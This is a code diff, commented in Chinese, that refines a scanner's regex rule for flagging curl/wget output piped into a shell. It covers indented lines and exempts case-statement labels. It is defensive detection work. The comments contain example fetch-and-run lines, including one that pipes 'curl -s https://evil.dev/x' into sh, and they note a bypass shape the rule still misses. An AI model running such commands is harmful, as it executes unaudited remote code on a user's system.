@@ -123,14 +123,34 @@ function logicalFirstToken(lines, head, end) {
  *   ③ 控制词可以连着来（外层 `+`）⇒ 组合形 `if ! curl … | sh; then` 命中；
  *   ④ `in` / 标签都不在表里 ⇒ `case "$TOOL" in curl) busybox wget … | sh ;; esac` 整行 0 命中
  *      —— 「任意单词后都算」的过宽版会红在 T3.3-B4 与 B2 上（变异 M3）。
- * `^\s*` 只加在控制词那一边：行首带缩进的**裸** `curl … | sh` 改前改后都是 0（收它会直接改变真包里
- * 缩进写法的命中面，工单 §4.4 期望 −0/+0），本轮不动，钉成观察 T3.3-D2。
+ * 收缩进与标签豁免（Task 3.4，工单 §2）：第一支的 `^` 收成 `^\s*`，缩进裸写的管道（真包
+ * entware-installer-for-magisk customize.sh:142 逐字那一行）从 0/low/auto-approve 变成 high/block；
+ * 作为交换，行首缩进第一次把顶格式的两个旧形状（缩进 `curl)` 标签 = N1/N2）抬到了左边界上，
+ * 由下面那条 CASE_LABEL_GUARD 一起闭掉。上面「`in`/标签都不在表里」的形状约束 ④ 不变，
+ * 钉死的夹具从 T3.3-B4/D2 移交到 T3.4-B1/B3 与 T3.3-D2（已翻期望）。
  */
 const SHELL_CONTROL_ALT = [...SHELL_CONTROL_WORDS]
   .map((w) => w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')) // 表里的 `{` `}` 必须按字面量进分支
   .join('|');
 const SHELL_STATEMENT_START = `(?:^\\s*|[|;&\`(]\\s*)(?:(?:${SHELL_CONTROL_ALT})\\s+)+`;
-const PIPE_TO_SHELL_LEFT_EDGE = `(?:^|[|;&\`(]\\s*|${SHELL_STATEMENT_START})`;
+const PIPE_TO_SHELL_LEFT_EDGE = `(?:^\\s*|[|;&\`(]\\s*|${SHELL_STATEMENT_START})`;
+
+/**
+ * Task 3.4（工单 §2）：case 标签豁免 —— 「下载器那个词**紧跟** `)`」不算命令。
+ *
+ * 它是**左边界判据的一半**，不是形状豁免：收缩进 `^\s*` 之后，`    curl)    busybox wget … | sh ;;`
+ * 这种行首缩进的 case 标签行第一次站在了语句起点上，`^\s*curl` + `[^\n|]*\|` 会把它后半行整个吞成
+ * 一条 high 误报（计划 §0.20 天真修法的打桩实测）；`(?!\s*\))` 让紧跟 `)` 的下载器词退回非命令位。
+ * 「curl )」这种带空格的标签同样豁免（`\s*` 吃掉中间空白）。fix6-F1 的口径本轮同样适用：
+ * 它豁免的是「标签不是命令」这一格，**不是**「这个文件可以放过」。
+ *
+ * 只许拼进 PIPE_TO_SHELL 第一支**一次**（夹具 T3.4-C1 按 pattern.source 数字面量出现次数 = 1 ——
+ * 两处都加就是两份口径，早晚分叉）；`<(` 第二支没有标签形状，明令不拼（工单 §2）。
+ * 已知的限度（工单 §3 E1，交回主控不修）：`    curl) curl -s https://evil.dev/x | sh ;;` ——
+ * 标签形状**后面**接真管道，豁免咬住第一个 `curl`、第二个 `curl` 又不在任何左边界之后 ⇒ 仍 0 命中。
+ * 收它就得让「标签后面再出下载器」翻回命中，那等于把 N1/N2/N6 那格误报再开回去。
+ */
+const CASE_LABEL_GUARD = '(?!\\s*\\))';
 
 // 给 matcher（exclude / severityFor）的第三个可选参数：这一行在逻辑行里的位置。
 // 老规则一个都不用改签名 —— 它是**加参数**，不是改既有参数顺序。
@@ -311,11 +331,14 @@ export const PIPE_TO_SHELL = makeLineRule({
   severity: 'high',
   title: '下载内容直连 shell 执行（curl|sh / wget|sh）',
   advice: '禁止。远程内容可在 root 下任意执行且无法审计，必须先落盘、校验校验和，再执行。',
-  // Task 3.3：只有**左边界**换了（并上「控制词 + 空白」那一支，见 SHELL_STATEMENT_START 的说明）。
-  // 右半 `\|[^\n]*\b(?:sh|bash|…)\b`、下载器那四个写法、以及 `sh <(curl …)` 那一支逐字未动 ——
+  // Task 3.3：左边界并上「控制词 + 空白」那一支（见 SHELL_STATEMENT_START 的说明）；
+  // Task 3.4：第一支 `^` 收成 `^\s*`（收缩进缩进裸写），并在下载器组之后拼**恰好一条**
+  // CASE_LABEL_GUARD（紧跟 `)` 的标签不是命令）。拼点在 `\b` 之前 —— 与拼在 `\b` 之后逐字等价
+  //（两者都是零宽、同一个位置），但它让 T3.3-C1 钉的「右半三段」字节面一字未动（工单 §2 的口径）。
+  // 右半 `\|[^\n]*\b(?:sh|bash|…)\b`、下载器四个写法、以及 `sh <(curl …)` 那一支逐字未动 ――
   // 由夹具 T3.3-C1 按 pattern.source 逐段子串对账（severity/category/title/advice 同一条钉着）。
   pattern: new RegExp(
-    `${PIPE_TO_SHELL_LEFT_EDGE}(?:curl|wget|busybox\\s+wget|busybox\\s+curl)\\b[^\\n|]*\\|[^\\n]*\\b(?:sh|bash|ash|ksh|zsh|python3?|perl|su)\\b`
+    `${PIPE_TO_SHELL_LEFT_EDGE}(?:curl|wget|busybox\\s+wget|busybox\\s+curl)${CASE_LABEL_GUARD}\\b[^\\n|]*\\|[^\\n]*\\b(?:sh|bash|ash|ksh|zsh|python3?|perl|su)\\b`
     + `|\\b(?:sh|bash|ash)\\s*<\\(\\s*(?:curl|wget)\\b`),
 });
 
